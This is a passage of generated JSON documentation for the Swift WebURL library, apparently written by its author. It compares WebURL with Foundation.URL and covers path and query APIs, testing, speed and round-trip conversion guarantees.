{"," \/\/ ✅ issueNumber = 63","}"],"type":"codeListing"},{"syntax":"swift","code":["var url = WebURL(\"https:\/\/info.myapp.com\")!","url.pathComponents += [\"music\", \"bands\" \"AC\/DC\"]","\/\/ ✅ \"https:\/\/info.myapp.com\/music\/bands\/AC%2FDC\""],"type":"codeListing"},{"type":"paragraph","inlineContent":[{"type":"text","text":"The "},{"code":".formParams","type":"codeVoice"},{"type":"text","text":" view takes query parameters to the next level, with dynamic member lookup."},{"type":"text","text":" "},{"type":"text","text":"You just get and set values as if they were properties. Zero fuss:"}]},{"syntax":"swift","code":["var url = WebURL(\"https:\/\/example.com\/search?category=food&client=mobile\")!","url.formParams.category  \/\/ \"food\"","url.formParams.client    \/\/ \"mobile\"","","url.formParams.format = \"json\"","\/\/ ✅ \"https:\/\/example.com\/search?category=food&client=mobile&format=json\"","\/\/                                                            ^^^^^^^^^^^"],"type":"codeListing"},{"type":"paragraph","inlineContent":[{"text":"Here’s a challenge: with WebURL, that was 3 lines of super obvious code.","type":"text"},{"text":" ","type":"text"},{"text":"Now try doing that with ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":". Yeah.","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"The ","type":"text"},{"code":".host","type":"codeVoice"},{"text":" API is less frequently used, but even here we can offer a breakthrough in expressive, robust code.","type":"text"},{"text":" ","type":"text"},{"text":"With WebURL, the URL type tells applications ","type":"text"},{"inlineContent":[{"text":"directly","type":"text"}],"type":"emphasis"},{"text":" which computer the URL points to. I really love this.","type":"text"},{"text":" ","type":"text"},{"text":"I think this is ","type":"text"},{"inlineContent":[{"type":"text","text":"exactly"}],"type":"emphasis"},{"text":" what a Swift URL API should be; it takes a complex, nebulous string","type":"text"},{"text":" ","type":"text"},{"text":"and gives you simple, precise, structured values with strong guarantees.","type":"text"}]},{"syntax":"swift","code":["let url = WebURL(\"http:\/\/127.0.0.1:8888\/my_site\")!","","guard url.scheme == \"http\" || url.scheme == \"https\" else {","  throw UnknownSchemeError()","}","switch url.host {","  case .domain(let name): ... \/\/ DNS lookup.","  case .ipv4Address(let address): ... \/\/ Connect to known address.","  case .ipv6Address(let address): ... \/\/ Connect to known address.","  case .opaque, .empty, .none: fatalError(\"Not possible for http\")","}"],"type":"codeListing"},{"type":"paragraph","inlineContent":[{"text":"Come for the web-compatible URL parsing, or backwards-deployable IDN support;","type":"text"},{"text":" ","type":"text"},{"text":"stay because literally everything else is lightyears ahead as well.","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"And you can still hand values over to legacy "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" code whenever you need to."},{"type":"text","text":" "},{"type":"text","text":"So you can take advantage of these APIs today, where you need them, without forcing everything to be rewritten."}]}]},{"content":[{"inlineContent":[{"text":"📊 It’s ","type":"text"},{"type":"emphasis","inlineContent":[{"type":"text","text":"really"}]},{"text":" well tested.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"code":"WebURL","type":"codeVoice"},{"text":" is extensively tested by the Web Platform Tests. The WPT is a shared test database","type":"text"},{"text":" ","type":"text"},{"text":"used by the major browsers and other libraries; we pool our implementation experience to ensure that","type":"text"},{"text":" ","type":"text"},{"text":"any ambiguities or divergence is spotted and eliminated (sometimes the standard is ambiguous; that gets corrected).","type":"text"},{"text":" ","type":"text"},{"text":"The WebURL project has made a lot of contributions towards that effort, including finding and fixing issues","type":"text"},{"text":" ","type":"text"},{"text":"in browsers and elsewhere.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"This whole process is a really valuable positive cycle, and helps give you confidence that WebURL will work","type":"text"},{"text":" ","type":"text"},{"text":"just like, say, Safari. We literally use the same test suite.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"Unfortunately, "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":" simply cannot participate in that process, or anything like it."},{"type":"text","text":" "},{"type":"text","text":"Nobody’s writing new implementations of the obsolete RFC-2396."}],"type":"paragraph"},{"inlineContent":[{"text":"The WPT alone is over 3x as large as Foundation’s test database, and includes much better quality test-cases","type":"text"},{"text":" ","type":"text"},{"text":"because it is exposed to the entire web and actively maintained. Foundation’s tests actually include","type":"text"},{"text":" ","type":"text"},{"text":"plenty of mistakes (!), so it actually tests incorrect behavior 🤦‍♂️. My guess is that Foundation is not able","type":"text"},{"text":" ","type":"text"},{"text":"to fix those due to compatibility, but who knows? They don’t respond at all to any of the dozen or so bug reports","type":"text"},{"text":" ","type":"text"},{"text":"I’ve filed, showing some pretty shocking bugs in ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":". That’s not even to mention that lots of","type":"text"},{"text":" ","type":"text"},{"text":"publicly-known URL exploits are actually monkey-patched in WebKit rather than being fixed at the source","type":"text"},{"text":" ","type":"text"},{"text":"(which is the buggy CFURL parser). Perhaps they can’t fix those, either? I don’t like to mention that kind of thing","type":"text"},{"text":" ","type":"text"},{"text":"due to responsible disclosure, but you deserve to know that your code might be vulnerable. The disclosure process","type":"text"},{"text":" ","type":"text"},{"text":"happened years ago.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"In contrast, testing has been a major focus of "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" since the beginning. As well as the WPT,"},{"type":"text","text":" "},{"type":"text","text":"WebURL is tested by "},{"type":"emphasis","inlineContent":[{"text":"hundreds","type":"text"}]},{"type":"text","text":" of additional tests, covering every aspect of its API. Our coverage is about 88%"},{"type":"text","text":" "},{"type":"text","text":"as of writing (generally regarded as excellent), and the gaps are mostly things that can’t easily be tested"},{"type":"text","text":" "},{"type":"text","text":"in Swift (such as assertion failures). And if "},{"type":"emphasis","inlineContent":[{"type":"text","text":"all of that"}]},{"type":"text","text":" wasn’t enough, "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" is regularly fuzz-tested,"},{"type":"text","text":" "},{"type":"text","text":"as are the URL type conversions. Because our checked conversions actually "},{"type":"emphasis","inlineContent":[{"type":"text","text":"account for bugs in Foundation"}]},{"type":"text","text":" "},{"type":"text","text":"to make sure nothing slips through the cracks."}],"type":"paragraph"},{"inlineContent":[{"text":"All of this means that you can have confidence adopting ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" ","type":"text"},{"inlineContent":[{"type":"text","text":"right now"}],"type":"emphasis"},{"text":".","type":"text"},{"text":" ","type":"text"},{"text":"Obviously nobody can guarantee zero bugs ever, but WebURL is a massive improvement - and as a Swift package,","type":"text"},{"text":" ","type":"text"},{"text":"any fixes can be implemented and deployed immediately. No more chucking bug reports in to a void","type":"text"},{"text":" ","type":"text"},{"text":"and being disappointed as year after year they go ignored and unfixed.","type":"text"}],"type":"paragraph"}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"🔥 It’s blazing fast."}]},{"type":"paragraph","inlineContent":[{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" is regularly benchmarked, and comes out faster than "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":" for "},{"type":"emphasis","inlineContent":[{"text":"every","type":"text"}]},{"type":"text","text":" operation;"},{"type":"text","text":" "},{"type":"text","text":"whether you’re parsing URL strings, modifying components, iterating through the path, etc."},{"type":"text","text":" "},{"type":"text","text":"In particular, it is "},{"type":"strong","inlineContent":[{"type":"text","text":"orders of magnitude"}]},{"type":"text","text":" faster on low-end\/IoT platforms like the Raspberry Pi,"},{"type":"text","text":" "},{"type":"text","text":"enabling applications which were previously so slow they’d be impractical."}]}]}]},{"type":"heading","level":2,"anchor":"A-Note-on-Round-Tripping","text":"A Note on Round-Tripping"},{"type":"paragraph","inlineContent":[{"text":"Round-tripping refers to taking a value (say, a ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":"), converting it to another type (","type":"text"},{"type":"codeVoice","code":"Foundation.URL"},{"text":"),","type":"text"},{"text":" ","type":"text"},{"text":"and then converting back to the original type (to ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" again). Some libraries and data structures need","type":"text"},{"text":" ","type":"text"},{"text":"strong guarantees about that situation, so here it is:","type":"text"}]},{"type":"unorderedList","items":[{"content":[{"inlineContent":[{"type":"text","text":"A "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" which can be converted to a "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" value can "},{"type":"strong","inlineContent":[{"text":"always","type":"text"}]},{"type":"text","text":" be converted back to a "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":"."}],"type":"paragraph"}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"A "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" which can be converted to a "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" can "},{"type":"strong","inlineContent":[{"text":"almost always","type":"text"}]},{"type":"text","text":" be converted back to a "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":"."}]},{"name":"Note","style":"note","content":[{"inlineContent":[{"text":"","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"There is one, very rare situation where a Foundation -> WebURL conversion cannot be converted back:","type":"text"},{"text":" ","type":"text"},{"text":"HTTP URLs whose hostnames contain percent-encoded special characters. These will get decoded by ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":",","type":"text"},{"text":" ","type":"text"},{"text":"but can’t be re-encoded for the conversion back to Foundation.","type":"text"}],"type":"paragraph"},{"syntax":"swift","code":["(Foundation \"http:\/\/te%7Bs%7Dt\/\") -> (WebURL \"http:\/\/te{s}t\/\") -> (Rejected by Foundation)","                      ^^^ ^^^                          ^ ^"],"type":"codeListing"},{"inlineContent":[{"type":"text","text":"These are not valid DNS domain names, so this is mostly a theoretical concern."},{"type":"text","text":" "},{"type":"text","text":"Generally, you can assume that Foundation -> WebURL conversion means the result can be converted back"},{"type":"text","text":" "},{"type":"text","text":"to a "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":"."}],"type":"paragraph"}],"type":"aside"}]}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Sometimes, when converting a "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" to Foundation, we need to add percent-encoding; this means the round-trip"},{"type":"text","text":" "},{"type":"text","text":"result will not be equal to the original "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" value. However, you can use the "},{"code":"WebURL.encodedForFoundation","type":"codeVoice"},{"type":"text","text":" "},{"type":"text","text":"property to add that percent-encoding in advance; if this pre-encoded URL can be converted to a "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":","},{"type":"text","text":" "},{"type":"text","text":"it is guaranteed to round-trip to exactly the same "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" value."}]},{"type":"codeListing","code":["func processURL(_ webURL: WebURL) throws {","","  let encodedWebURL = webURL.encodedForFoundation","  \/\/ ℹ️                     ^^^^^^^^^^^^^^^^^^^^^","  \/\/ Percent-encoding is added by default when converting to Foundation.","  \/\/ If we do it now, we know the round-trip result will equal 'encodedWebURL'.","","  guard let convertedURL = URL(encodedWebURL) else { throw InvalidURLError() }","","  \/\/ Do whatever you needed to do with Foundation... ","  let dataTask = URLSession.shared.dataTask(from: convertedURL)","  let urlFromDataTask = dataTask.originalRequest!.url!","","  \/\/ ✅ A converted WebURL can always convert back. ","  let roundtripWebURL = WebURL(urlFromDataTask)!","","  \/\/ ✅ The round-trip result is equal to 'encodedWebURL'. ","  assert(encodedWebURL == roundtripWebURL)","}"],"syntax":"swift"},{"type":"paragraph","inlineContent":[{"type":"text","text":"It is not generally possible to know in advance what the result of a "},{"code":"{Foundation -> WebURL -> Foundation}","type":"codeVoice"},{"type":"text","text":" round-trip"},{"type":"text","text":" "},{"type":"text","text":"will be. There is no equivalent of "},{"code":"WebURL.encodedForFoundation","type":"codeVoice"},{"type":"text","text":" which normalizes a "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":"."}]}]}],"hierarchy":{"paths":[["doc:\/\/com.karwa.WebURL\/documentation\/WebURL"]]},"abstract":[{"text":"Best practices when mixing URL standards","type":"text"}],"kind":"article","schemaVersion":{"minor":3,"major":0,"patch":0},"identifier":{"interfaceLanguage":"swift","url":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/FoundationInterop"},"references":{"doc://com.karwa.WebURL/documentation/WebURL":{"role":"collection","kind":"symbol","type":"topic","abstract":[{"type":"text","text":"A new URL type for Swift."}],"identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL","url":"\/documentation\/weburl","title":"WebURL"},"doc://com.karwa.WebURL/documentation/WebURL/WebURL/jsModel-swift.property":{"kind":"symbol","type":"topic","title":"jsModel","identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/WebURL\/jsModel-swift.property","fragments":[{"text":"var","kind":"keyword"},{"text":" ","kind":"text"},{"text":"jsModel","kind":"identifier"},{"text":": ","kind":"text"},{"text":"WebURL","preciseIdentifier":"s:6WebURLAAV","kind":"typeIdentifier"},{"text":".","kind":"text"},{"text":"JSModel","preciseIdentifier":"s:6WebURLAAV7JSModelV","kind":"typeIdentifier"}],"abstract":[{"text":"A read-write view of this URL with the same API as JavaScript’s ","type":"text"},{"code":"URL","type":"codeVoice"},{"text":" class.","type":"text"}],"url":"\/documentation\/weburl\/weburl\/jsmodel-swift.property","role":"symbol"},"https://github.com/apple/swift-package-manager/blob/e25a590dc455baa430f2ec97eacc30257c172be2/Sources/PackageCollections/PackageCollections%2BValidation.swift#L35":{"titleInlineContent":[{"text":"here","type":"text"}],"identifier":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/PackageCollections%2BValidation.swift#L35","title":"here","type":"link","url":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/PackageCollections%2BValidation.swift#L35"},"https://github.com/swift-server/async-http-client/blob/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337/Sources/AsyncHTTPClient/DeconstructedURL.swift#L45":{"titleInlineContent":[{"text":"here","type":"text"}],"identifier":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/DeconstructedURL.swift#L45","title":"here","type":"link","url":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/DeconstructedURL.swift#L45"},"https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/":{"titleInlineContent":[{"text":"a real vulnerability","type":"text"}],"identifier":"https:\/\/bugs.xdavidhu.me\/google\/2021\/12\/31\/fixing-the-unfixable-story-of-a-google-cloud-ssrf\/","title":"a real vulnerability","type":"link","url":"https:\/\/bugs.xdavidhu.me\/google\/2021\/12\/31\/fixing-the-unfixable-story-of-a-google-cloud-ssrf\/"},"https://github.com/apple/swift-package-manager/blob/e25a590dc455baa430f2ec97eacc30257c172be2/Sources/PackageCollections/Model/Collection.swift#L116":{"titleInlineContent":[{"text":"here","type":"text"}],"identifier":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/Model\/Collection.swift#L116","title":"here","type":"link","url":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/Model\/Collection.swift#L116"},"https://github.com/apple/swift-docc/blob/d94139a5e64e9ecf158214b1cded2a2880fc1b02/Sources/SwiftDocC/Model/TaskGroup.swift#L43-L44":{"titleInlineContent":[{"text":"don’t","type":"text"}],"identifier":"https:\/\/github.com\/apple\/swift-docc\/blob\/d94139a5e64e9ecf158214b1cded2a2880fc1b02\/Sources\/SwiftDocC\/Model\/TaskGroup.swift#L43-L44","title":"don’t","type":"link","url":"https:\/\/github.com\/apple\/swift-docc\/blob\/d94139a5e64e9ecf158214b1cded2a2880fc1b02\/Sources\/SwiftDocC\/Model\/TaskGroup.swift#L43-L44"},"https://github.com/swift-server/async-http-client/blob/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337/Sources/AsyncHTTPClient/Scheme.swift#L42":{"titleInlineContent":[{"text":"here","type":"text"}],"identifier":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/Scheme.swift#L42","title":"here","type":"link","url":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/Scheme.swift#L42"}}}